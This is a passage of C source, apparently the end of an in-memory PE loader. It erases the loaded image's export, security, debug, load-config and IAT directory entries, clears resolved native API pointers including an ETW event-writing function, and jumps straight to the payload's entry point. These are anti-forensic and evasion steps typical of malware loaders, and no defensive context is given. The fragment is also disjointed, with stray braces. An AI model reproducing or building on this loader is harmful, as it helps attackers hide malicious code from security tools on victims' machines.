            IMAGE_DIRECTORY_ENTRY_EXPORT,      
            IMAGE_DIRECTORY_ENTRY_SECURITY,    
            IMAGE_DIRECTORY_ENTRY_DEBUG,      
            IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG, 
            IMAGE_DIRECTORY_ENTRY_IAT          
        }; for (BYTE i = 0;  i < sizeof(idx);  i++) 
            *(PUINT64)&dd[idx[i]] = 0; 
        

        pNtProtectVirtualMemory(CUR_PROC, &iadr, &asz, PAGE_READONLY, &op);
    }
    FreeBuf(buf, PE_EXE_SZ);}
    
    

    pNtEtwEventWrite           = NULL;
    pNtAllocateVirtualMemory   = NULL;
    pNtFreeVirtualMemory       = NULL;
    pNtProtectVirtualMemory    = NULL;
    pLdrLoadDll                = NULL;
    pLdrGetProcedureAddress    = NULL;
    pRtlAddFunctionTable       = NULL;
    pNtQueryInformationProcess = NULL;
    pNtSetInformationProcess   = NULL;
    pNtSetInformationThread    = NULL;
    pNtOpenFile                = NULL;
    pNtReadFile                = NULL;
    pNtClose                   = NULL;
    pNtQueryInformationFile    = NULL;
    pNtTerminateProcess        = NULL;
}//*
    
    

    #if defined(_MSC_VER)
        ((EntryPoint_t)AddrEntry)();
    #else
        __asm__ volatile (
            "cld\n\t"

            "andq $-16, %%rsp\n\t"    
            "subq $40,  %%rsp\n\t"    
            
            "jmpq *%0\n\t"   
            : : "r"(AddrEntry) 
            : "memory"
        ); 
    #endif
    return STATUS_SUCCESS;
}
